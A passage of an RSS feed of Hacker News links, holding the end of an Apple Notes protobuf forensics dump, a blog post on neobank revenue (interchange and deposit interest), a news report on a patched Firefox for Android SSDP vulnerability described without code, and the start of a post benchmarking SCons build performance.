    <span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span>
    <span>2</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
        <span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span>
        <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span>
        <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
            <span>2</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>"Pure blob title"</span>
            <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>)</span>
                <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span>
                <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>)</span>
                <span>5</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span>
            <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>)</span>
                <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>5</span>
                <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>)</span>
                <span>5</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>2</span>
            <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>5</span><span>)</span>
                <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>5</span>
                <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>8</span><span>)</span>
                <span>4</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span>
                <span>5</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>3</span>
            <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>10</span><span>)</span>
                <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>4</span>
                <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>)</span>
                <span>4</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span>
                <span>5</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>4</span>
            <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>14</span><span>)</span>
                <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>10</span>
                <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>)</span>
                <span>5</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>5</span>
            <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                    <span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span>
                    <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>4294967295</span>
                <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span>
                <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                    <span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span>
                    <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>4294967295</span>
            <span>4</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                    <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>bytes</span> <span>(</span><span>16</span><span>)</span>
                        <span>0000</span>   <span>EE</span> <span>FE</span> <span>10</span> <span>DA</span> <span>5</span><span>A</span> <span>79</span> <span>43</span> <span>25</span> <span>88</span> <span>BA</span> <span>6</span><span>D</span> <span>CA</span> <span>E2</span> <span>E9</span> <span>B7</span> <span>EC</span>                          <span>....</span><span>ZyC</span><span>%</span><span>..</span><span>m</span><span>.....</span>
                    <span>2</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>24</span><span>)</span>
                    <span>2</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>9</span><span>)</span>
            <span>5</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>5</span>
                <span>2</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>,</span> <span>3</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>)</span>
            <span>5</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>5</span>
                <span>2</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>,</span> <span>3</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>)</span>
            <span>5</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
          ‚Ä¶</code></pre></figure></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ciofecaforensics.com/2020/09/18/apple-notes-revisited-protobuf/">https://ciofecaforensics.com/2020/09/18/apple-notes-revisited-protobuf/</a></em></p>]]>
            </description>
            <link>https://ciofecaforensics.com/2020/09/18/apple-notes-revisited-protobuf/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24531472</guid>
            <pubDate>Sun, 20 Sep 2020 02:00:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Do Neobanks Make Money?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24531372">thread link</a>) | @michaelm244
<br/>
September 19, 2020 | https://blog.mattheakis.com/how_do_neobanks_make_money/ | <a href="https://web.archive.org/web/*/https://blog.mattheakis.com/how_do_neobanks_make_money/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <article>
  
  <time datetime="2020-09-15T06:52:31+00:00">15 Sep 2020</time>
  <p>Neobanks are on a tear and users are loving them. Neobanks are online-only banks, typically funded by venture capital, that piggy-back on top of an existing institution‚Äôs banking license and offer a way for customers to store/spend money. Examples include Revolut, Nubank, Chime, Simple, N26, and more. They have a real shot at becoming the mainstream banking choice for customers over the next decade. Nubank, the most popular neobank in Brazil, recently <a href="https://www.reuters.com/article/us-nubank-brazil-growth/brazilian-fintech-nubank-has-grown-to-15-million-users-ceo-idUSKBN1WQ26C" target="_blank">announced</a> that they have 15 million customers. For reference, Wells Fargo has <a href="https://google.com/" target="_blank">22 million active users</a> on its mobile app. Neobanks are a rising force and key in understanding where the financial services industry is headed.</p>

<p>But how do these neobanks make money? The imprecise answer of ‚Äúthey make money when you swipe their card‚Äù doesn‚Äôt tell you much. In this post, I‚Äôll concretely show how the mechanics of a neobank‚Äôs business model works.</p>

<p>Let‚Äôs take a look at <a href="https://www.chime.com/" target="_blank">Chime</a>, the largest consumer neobank in the US. Chime‚Äôs core offering is a debit card alongside checking and savings accounts. They have nifty features like the ability to receive your paycheck two days early, no overdraft fees, and 100% mobile banking. With 60% of Americans not being able to cover a surprise $1,000 expense, a 2-day advance on a paycheck can be a huge relief for managing expenses. And the nixing of overdraft fees is a massive help for the <a href="https://www.pymnts.com/news/banking/2018/banking-overdraft-fees-cfbp-credit-unions/" target="_blank">US consumers paying a mind-boggling $34 billion/year</a> in overdraft fees. These differentiated features have led to Chime amassing <a href="https://techcrunch.com/2019/09/04/chime-now-has-5-million-customers-and-introduces-overdraft-alternative/" target="_blank">5 million customers</a> and <a href="https://www.businessinsider.com/chime-set-to-quadruple-revenue-in-2019-2019-11" target="_blank">$200 million in annualized revenue</a>.</p>

<p><strong>A neobank like Chime primarily makes money in two ways:</strong></p>

<ol>
  <li>Interchange revenue paid by payment processors (e.g., Stripe) when they process a payment for a Chime card</li>
  <li>Collecting interest from users‚Äô deposits</li>
</ol>

<p>Although some neobanks have different revenue streams (e.g., Wealthfront charges users roboadvisor fees as a percentage of the total value of assets stored with them), interchange and deposits interest are the two largest and most common revenue streams for neobanks. These are also some of the largest revenue streams for big banks (lending though typically being the largest).</p>

<h3 id="interchange"><strong>Interchange</strong></h3>

<p>Interchange revenue is money that a card issuer (such as Chime) receives when someone swipes their card. Interchange is paid by the merchant through payment processing fees. The merchant is the party accepting a card payment in return for goods/services (e.g., your local supermarket). As an example, if a merchant uses <a href="https://stripe.com/" target="_blank">Stripe</a> for payment processing and is paying the standard <a href="https://stripe.com/pricing" target="_blank">2.9%</a> in transaction fees, Stripe will use a portion of that 2.9% to pay the card issuer.</p>

<h2><img src="https://www.helcim.com/pictures/credit-card-processing-flow-152858808066.jpg" alt="card_process"></h2>

<p>Image Credit: <a href="https://www.helcim.com/article/how-credit-card-processing-works/" target="_blank">Helcim</a></p>

<p>The specific amount paid to the card issuer depends on a number of factors and it varies for every transaction. The most important factors are:</p>

<ul>
  <li>Whether the card is debit or credit
    <ul>
      <li>Credit is significantly higher interchange</li>
    </ul>
  </li>
  <li>Whether the card has specific rewards/perks
    <ul>
      <li><a href="https://usa.visa.com/pay-with-visa/cards/visa-credit-cards/visa-infinite-credit-cards.html" target="_blank">Visa Infinite</a> (many rewards/perks) has a higher interchange rate than the standard Visa card</li>
    </ul>
  </li>
  <li>The type of the merchant for a given transaction
    <ul>
      <li>Hotels have some of the highest interchange rates</li>
    </ul>
  </li>
</ul>

<p>Ultimately the card network (e.g., Visa) decides what the interchange rates are. The key equation for an interchange revenue stream is:</p>

<p><i>avg. interchange rate * total transaction volume</i></p>

<p>In Chime‚Äôs case, their cards are on the Visa network so Visa decides how much interchange they receive. The Visa interchange rates, along with Chime‚Äôs specific rates, are <a href="https://usa.visa.com/dam/VCOM/download/merchants/visa-usa-interchange-reimbursement-fees.pdf" target="_blank">public</a> <sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>. Depending on the type of merchant and transaction, Chime earns between 0.8% - 1.9% of a transaction‚Äôs amount, Although it‚Äôs impossible to know the exact amount of interchange Chime receives without knowing the distribution of Chime users‚Äô spending, a reasonable guess based on aggregate consumer spending would put Chime‚Äôs average interchange rate at 1.25%<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup>. This means that Chime receives around 1.25% of _all spending on their cards_. Not bad! There are still a handful of costs that Chime has to pay per transaction:</p>

<ul>
  <li>Intermediary card processors
    <ul>
      <li>Example: Chime uses <a href="https://www.galileo-ft.com/" target="_blank">Galileo</a>, which likely charges them anywhere from 0.05% - 0.4% of transaction volume</li>
    </ul>
  </li>
  <li>Fraud: if a customer loses their card and a thief spends money on it, Chime may have to cover the cost
    <ul>
      <li>Note: keep in mind that since Chime is offering debit cards, not credit cards, there is no risk of the customer not paying back Chime for transactions</li>
    </ul>
  </li>
  <li>Server costs: the server that has to process a transaction</li>
</ul>

<p>Even with these costs, Chime is still making a handsome profit per transaction. Being the card issuer, as they are here, is a very high-margin business.</p>

<h3 id="deposits-interest"><strong>Deposits Interest</strong></h3>

<p>Interest revenue is earned by a depository institution investing customer funds in low-risk securities. The depository institution typically also pays the customer for keeping their deposits at the institution. The key equation for profitability of this revenue stream is:</p>

<p><i>(% interest earned - % interest paid to depositor) * deposits amount</i></p>

<p>The <em>% interest earned</em> for neobanks is typically equal to the <a href="https://fred.stlouisfed.org/series/FEDFUNDS" target="_blank">effective federal funds rate</a>. Because the federal funds rate is constantly shifting, the profitability of this revenue stream for neobanks is constantly shifting. This is why neobanks frequently change the interest rate offered to depositors (see <a href="https://blog.wealthfront.com/category/product-news/" target="_blank">Wealthfront‚Äôs blog</a> as an example). This is a stark contrast to big banks however. A key benefit of a banking charter is that banks can lend out a multiple of their deposits as loans (e.g., mortgages, business loans). This amount is referred to as net interest margin, and is typically much higher than the federal funds rate - <a href="https://www.investopedia.com/ask/answers/061715/what-net-interest-margin-typical-bank.asp" target="_blank">it was 3.3% on average for banks in 2018</a>. The _% interest paid to depositor* is how much the depositor earns by storing their funds with the institution, and is set by the depository institution. For the recent wave of high-yield accounts offered by neobanks, they‚Äôve set <em>% interest paid to depositor</em> essentially equal to *% interest earned_, making this revenue stream‚Äôs profitability close to zero. The typical rationale is for the high-yield account to draw in consumers for other higher-margin products such as debit/credit cards or loans.</p>

<p>In Chime‚Äôs case, <em>% interest earned</em> (the federal funds rate) is 0.09% at the time of writing (Sept. 2020), and <a href="https://chime.zendesk.com/hc/en-us/articles/221487887-What-do-I-need-to-know-about-the-Chime-Savings-Account-" target="_blank"><em>% interest paid to depositor</em></a> is 1.00%. This means that Chime is actually losing money on their deposit account product, and likely using it as a <a href="https://en.wikipedia.org/wiki/Loss_leader" target="_blank">loss leader</a> for the debit card, which has far higher profit margins. Also note that Chime only gives depositors 1% in interest for funds in their savings account. For any funds in the checking account (which over all customers may be larger), no interest is given.</p>

<p>These are the two main revenue streams for the majority of neobanks, but there are also others such as <a href="https://en.wikipedia.org/wiki/Cross-selling" target="_blank">cross-selling</a>, <a href="https://www.svmcards.com/" target="_blank">reward redemption referrals</a>, and new ones being created by startups. Hopefully this has given you a grasp of the basics, let me know if you have any thoughts/questions below!</p>




  <br>
  
  
  
</article>

      </div></div>]]>
            </description>
            <link>https://blog.mattheakis.com/how_do_neobanks_make_money/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24531372</guid>
            <pubDate>Sun, 20 Sep 2020 01:29:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Bug Could Let Attackers Hijack Firefox for Android via Wi-Fi Network]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24530986">thread link</a>) | @assineproff
<br/>
September 19, 2020 | http://tech.thewebgangs.com/a-bug-could-let-attackers-hijack-firefox-for-android-via-wi-fi-network/ | <a href="https://web.archive.org/web/*/http://tech.thewebgangs.com/a-bug-could-let-attackers-hijack-firefox-for-android-via-wi-fi-network/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="tps_slideContainer_1237"><div>

<p>Dear Android users, if you use the Firefox web browser on your smartphones, make sure it has been updated to version 80 or the latest available version on the Google Play Store.</p>

<p>ESET security researcher Lukas Stefanko yesterday&nbsp;<a href="https://twitter.com/LukasStefanko/status/1307013106615418883" target="_blank" rel="noopener noreferrer">tweeted</a>&nbsp;an alert demonstrating the exploitation of a recently disclosed high-risk remote command execution vulnerability affecting the Firefox app for Android.</p>

<p>Discovered originally by Australian security researcher&nbsp;<a href="https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/red-team-tech-notes/-/tree/master/firefox-android-2020" target="_blank" rel="noopener noreferrer">Chris Moberly</a>, the vulnerability resides in the SSDP engine of the browser that can be exploited by an attacker to target Android smartphones connected to the same Wi-Fi network as the attacker, with Firefox app installed.</p>
<p>SSDP, stands for Simple Service Discovery Protocol, is a UDP based protocol that is a part of UPnP for finding other devices on a network. In Android, Firefox periodically sends out SSDP discovery messages to other devices connected to the same network, looking for second-screen devices to cast.</p>
<p>Any device on the local network can respond to these broadcasts and provide a location to obtain detailed information on a UPnP device, after which, Firefox attempts to access that location, expecting to find an XML file conforming to the UPnP specifications.</p>

<p>According to the vulnerability report Moberly submitted to the Firefox team, the SSDP engine of the victims‚Äô Firefox browsers can be tricked into triggering an Android intent by simply replacing location of the XML file in the response packets with a specially crafted message pointing to an Android intent URI.</p>
<p>For this, an attacker connected to a targeted Wi-Fi network can run a malicious SSDP server on his/her device and trigger intent-based commands on nearby Android devices through Firefox‚Äîwithout requiring any interaction from the victims.</p>
<p>Activities allowed by the intent also includes automatically launching the browser and open any defined URL, which, according to the researchers, is sufficient to trick victims into providing their credentials, install malicious apps, and other malicious activities based on the surrounding scenarios.</p>
<p>‚ÄúThe target simply has to have the Firefox application running on their phone. They do not need to access any malicious websites or click any malicious links. No attacker-in-the-middle or malicious app installation is required. They can simply be sipping coffee while on a cafe‚Äôs Wi-Fi, and their device will start launching application URIs under the attacker‚Äôs control,‚Äù Moberly said.</p>

<p>‚Äúit could have been used in a way similar to phishing attacks where a malicious site is forced onto the target without their knowledge in the hopes they would enter some sensitive info or agree to install a malicious application.‚Äù</p>
<p>Moberly reported this vulnerability to the Firefox team a few weeks back, which the browser maker has now patched in the Firefox for Android versions 80 and later.</p>
<p>Moberly has also released a&nbsp;<a href="https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/red-team-tech-notes/-/blob/master/firefox-android-2020/ffssdp.py" target="_blank" rel="noopener noreferrer">proof-of-concept exploit</a>&nbsp;to the public that Stefanko used to demonstrate the issue in the above video against three devices connected to the same network.</p>

</div></div></div>]]>
            </description>
            <link>http://tech.thewebgangs.com/a-bug-could-let-attackers-hijack-firefox-for-android-via-wi-fi-network/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24530986</guid>
            <pubDate>Sat, 19 Sep 2020 23:34:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SCons Is Still Slow]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24530845">thread link</a>) | @luu
<br/>
September 19, 2020 | https://blog.melski.net/2013/12/11/update-scons-is-still-really-slow/ | <a href="https://web.archive.org/web/*/https://blog.melski.net/2013/12/11/update-scons-is-still-really-slow/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<div>
					
					<!-- .entry-header -->

											<div>
							<p>A while back I posted a series of articles exploring the scalability of SCons, a popular Python-based build tool.  In a nutshell, my experiments showed that <b>SCons exhibits roughly quadratic growth in build runtimes as the number of targets increases</b>:</p>
<ul>
<li><a href="https://blog.melski.net/2011/05/23/why-is-scons-so-slow/">Why is SCons so slow?</a></li>
<li><a href="http://www.electric-cloud.com/blog/2010/03/08/how-scalable-is-scons/">How scalable is SCons?</a></li>
<li><a href="http://www.electric-cloud.com/blog/2010/07/21/a-second-look-at-scons-performance/">A second look at SCons performance</a></li>
<li><a href="http://www.electric-cloud.com/blog/2010/08/11/the-last-word-on-scons-performance/">The last word on SCons performance</a></li>
</ul>
<p>
Recently Dirk Baechle attempted to rebut my findings in an entry on the SCons wiki:  <a href="http://scons.org/wiki/WhySconsIsNotSlow">Why SCons is not slow</a>.  I thought Dirk made some credible suggestions that could explain my results, and he did some smart things in his effort to invalidate my results.  Unfortunately, his methods were flawed and his conclusions are invalid.  My original results still stand: <b>SCons really is slow.</b>  In the sections that follow I‚Äôll share my own updated benchmarks and show where Dirk‚Äôs analysis went wrong.</p>
<h3>Test setup</h3>
<p>
As before, I used <a href="https://github.com/emelski/scons_bench/blob/master/genscons.pl">genscons.pl</a> to generate sample builds ranging from 2,000 to 50,000 targets.  However, my test system was much beefier this time:</p>
<table>
<tbody><tr>
<th></th>
<th>2013</th>
<th>2010</th>
</tr>
<tr>
<th>OS</th>
<td>Linux Mint 14 (kernel version 3.5.0-17-generic)</td>
<td>RedHat Desktop 3 (kernel version 2.4.21-58.ELsmp)</td>
</tr>
<tr>
<th>CPU</th>
<td>Quad 1.7GHz Intel Core i7, hyperthreaded</td>
<td>Dual 2.4GHz Intel Xeon, hyperthreaded</td>
</tr>
<tr>
<th>RAM</th>
<td>16 GB</td>
<td>2 GB</td>
</tr>
<tr>
<th>HD</th>
<td>SSD</td>
<td>(unknown)</td>
</tr><tr>
<th>SCons</th>
<td>2.3.0</td>
<td>1.2.0.r3842</td>
</tr>
<tr>
<th>Python</th>
<td>2.7.3 (system default)</td>
<td>2.6.2</td>
</tr>
</tbody></table>
<p>
Before running the tests, I rebooted the system to ensure there were no rogue processes consuming memory or CPU.  I also forced the CPU cores into ‚Äúperformance‚Äù mode to ensure that they ran at their full 1.7GHz speed, rather than at the lower 933MHz they switch to when idle.</p>
<h3>Revisiting the original benchmark</h3>
<p>
I think Dirk had two credible theories to explain the results I obtained in my original tests.  First, Dirk wondered if those results may have been the result of <i>virtual memory swapping</i> ‚Äî my original test system had relatively little RAM, and SCons itself uses a lot of memory.  It‚Äôs plausible that physical memory was exhausted, forcing the OS to swap memory to disk.  As Dirk said, ‚Äúthis would explain the increase of build times‚Äù ‚Äî you bet it would!  I don‚Äôt remember seeing any indication of memory swapping when I ran these tests originally, but to be honest it was nearly 4 years ago and perhaps my memory is not reliable.  To eliminate this possibility, I ran the tests on a system with 16 GB RAM this time.  During the tests I ran <span><span face="Courier New">vmstat 5</span></span>, which collects memory and swap usage information at five second intervals, and captured the result in a log.</p>
<p>
Next, he suggested that I skewed the results by directing SCons to inherit the ambient environment, rather than using SCons‚Äô default ‚Äúsanitized‚Äù environment.  That is, he felt I should have used <span><span face="Courier New">env = Environment()</span></span> rather than <span><span face="Courier New">env = Environment(ENV = os.environ)</span></span>.  To ensure that this was not a factor, I modified the tests so that they did not inherit the environment.  At the same time, I substituted <span><span face="Courier New">echo</span></span> for the compiler and other commands, in order to make the tests faster.  Besides, I‚Äôm not interested in benchmarking the compiler ‚Äî just SCons!  Here‚Äôs what my <span><span face="Courier New">Environment</span></span> declaration looks like now:</p>
<pre title="">env = Environment(CC = 'echo', AR = 'echo', RANLIB = 'echo')
</pre>
<p>With these changes in place I reran my benchmarks.  As expected, there was no change in the outcome.  There is no doubt:  <b>SCons does <i>not</i> scale linearly</b>.  Instead the growth is <i>polynomial</i>, following an n<sup>1.85</sup> curve.  And thanks to the the <a href="https://github.com/emelski/scons_bench/blob/master/logs/2.3.0/001/50000.vmstat">vmstat output</a> we can be certain that there was absolutely no swapping affecting the benchmarks.  Here‚Äôs a graph of the results, including an n<sup>1.85</sup> curve for comparison ‚Äî notice that you can barely see that curve because it matches the observed data so well!</p>
<p>
<a href="https://emelski.files.wordpress.com/2013/12/scons_full.png"><img data-attachment-id="1040" data-permalink="https://blog.melski.net/2013/12/11/update-scons-is-still-really-slow/scons_full/#main" data-orig-file="https://emelski.files.wordpress.com/2013/12/scons_full.png" data-orig-size="500,500" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="SCons full build runtime" data-image-description="" data-medium-file="https://emelski.files.wordpress.com/2013/12/scons_full.png?w=300" data-large-file="https://emelski.files.wordpress.com/2013/12/scons_full.png?w=500" src="https://emelski.files.wordpress.com/2013/12/scons_full.png?w=640&amp;h=384" alt="SCons full build runtime - click for larger view" srcset="https://emelski.files.wordpress.com/2013/12/scons_full.png 500w, https://emelski.files.wordpress.com/2013/12/scons_full.png?w=150&amp;h=150 150w, https://emelski.files.wordpress.com/2013/12/scons_full.png?w=300&amp;h=300 300w" sizes="(max-width: 500px) 100vw, 500px"></a></p>
<p>
For comparison, I used the SCons build log to make a shell script that executes the same series of <span><span face="Courier New">echo</span></span> commands.  At 50,000 targets, the shell script ran in 1.097s.  You read that right:  <b>1.097s</b>.  Granted, the shell script doesn‚Äôt do stuff like up-to-date checks, etc., but still ‚Äî of the 3,759s average SCons runtime, 3,758s ‚Äî 99.97% ‚Äî is SCons overhead.</p>
<p>
I also created a non-recursive Makefile that ‚Äúbuilds‚Äù the same targets with the same <span><span face="Courier New">echo</span></span> commands.  This is a more realistic comparison to SCons ‚Äî after all, nobody would dream of actually controlling a build with a straight-line shell script, but lots of people would use GNU make to do it.  With 50,000 targets, GNU make ran for <b>82.469s</b> ‚Äî more than 45 times faster than SCons.</p>
<h3>What is linear scaling?</h3>
<p>
If the performance problems are so obvious, why did Dirk fail to see them?  Here‚Äôs a graph made from his test results:</p>
<p>
<a href="https://emelski.files.wordpress.com/2013/12/scons_baechle.png"><img data-attachment-id="1038" data-permalink="https://blog.melski.net/2013/12/11/update-scons-is-still-really-slow/scons_baechle/#main" data-orig-file="https://emelski.files.wordpress.com/2013/12/scons_baechle.png" data-orig-size="500,500" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="SCons full build runtime, via D. Baechle" data-image-description="" data-medium-file="https://emelski.files.wordpress.com/2013/12/scons_baechle.png?w=300" data-large-file="https://emelski.files.wordpress.com/2013/12/scons_baechle.png?w=500" src="https://emelski.files.wordpress.com/2013/12/scons_baechle.png?w=640&amp;h=640" alt="SCons full build runtime, via D. Baechle - click for full size" srcset="https://emelski.files.wordpress.com/2013/12/scons_baechle.png 500w, https://emelski.files.wordpress.com/2013/12/scons_baechle.png?w=150&amp;h=150 150w, https://emelski.files.wordpress.com/2013/12/scons_baechle.png?w=300&amp;h=300 300w" sizes="(max-width: 500px) 100vw, 500px"></a></p>
<p>
Dirk says that this <a href="http://scons.org/wiki/WhySconsIsNotSlow#Linear_scaling">demonstrates ‚ÄúSCons‚Äô linear scaling‚Äù</a>.  I find this statement baffling, because his data clearly shows that <i>SCons does not scale linearly</i>.  It‚Äôs simple, really:  <i>linear scaling</i> just means that the build time increases by the same amount for each new target you add, regardless of how many targets you already have.  Put another way, it means that the difference in build time between 1,000 targets and 2,000 targets is <i>exactly the same</i> as the difference between 10,000 and 11,000 targets, or between 30,000 and 31,000 targets.  Or, put yet another way, it means that when you plot the build time versus the number of targets, you should get a straight line with <i>no change in slope at any point</i>.  Now you tell me:  does that describe Dirk‚Äôs graph?</p>
<p>
